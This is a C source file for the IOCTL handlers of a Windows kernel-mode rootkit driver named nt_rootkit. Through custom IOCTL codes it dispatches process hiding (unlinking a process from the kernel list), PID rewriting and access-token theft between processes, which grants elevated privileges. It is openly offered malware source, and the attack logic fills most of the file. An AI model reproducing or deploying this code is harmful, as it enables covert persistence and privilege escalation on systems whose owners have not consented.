/*
 * ioctl.c
 *
 * Description: Implements IRP and driver object controls.
 */

#include <ntddk.h>
#include "ioctl.h"

NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp)
{
        UNREFERENCED_PARAMETER(dev_obj);
        PIO_STACK_LOCATION io_stack = NULL;

        io_stack = IoGetCurrentIrpStackLocation(irp);

        switch (io_stack->MajorFunction) {
        case IRP_MJ_CREATE:
                DbgPrint(DRIVER_PREFIX "handle to symlink opened");
                break;
        case IRP_MJ_CLOSE:
                DbgPrint(DRIVER_PREFIX "handle to symlink closed");
                break;
        }

        irp->IoStatus.Information = 0;
        irp->IoStatus.Status = STATUS_SUCCESS;
        IoCompleteRequest(irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}

NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp) 
{
        UNREFERENCED_PARAMETER(dev_obj);
        PIO_STACK_LOCATION io_stack = NULL;
        CHAR* response = "nt_rootkit: handled custom ioctl";
        
        io_stack = IoGetCurrentIrpStackLocation(irp);

        switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
        case IO_HIDE_PROC:
        {
                DbgPrint(DRIVER_PREFIX "recieved %s",
                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
                ULONG pid;
                RtlCharToInteger(
                        irp->AssociatedIrp.SystemBuffer, 10, &pid);
                proc_unlink(pid);
                response = "nt_rootkit: process hidden";
                break;
        }
        case IO_PID_PROC:
        {
                DbgPrint(DRIVER_PREFIX "recieved %s",
                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
                ULONG set_pid;
                RtlCharToInteger(
                        irp->AssociatedIrp.SystemBuffer, 10, &set_pid);
                proc_set_pid(set_pid);
                response = "nt_rootkit: process id set";
                break;
        }
        case IO_TOKEN_PROC:
        {
                token_steal data = 
                        *(token_steal*)irp->AssociatedIrp.SystemBuffer;
                DbgPrint(DRIVER_PREFIX "src pid: %d dest pid: %d", 
                        data.src, data.dest);
                proc_token_steal(data.src, data.dest);
                response = "nt_rootkit: token written";
                break;
        }
        default:
                break;
        }

        irp->IoStatus.Information = strlen(response);
        irp->IoStatus.Status = STATUS_SUCCESS;

        DbgPrint(DRIVER_PREFIX "responding to user");
        RtlCopyMemory(irp->AssociatedIrp.SystemBuffer, 
                response, strlen(response));

        IoCompleteRequest(irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}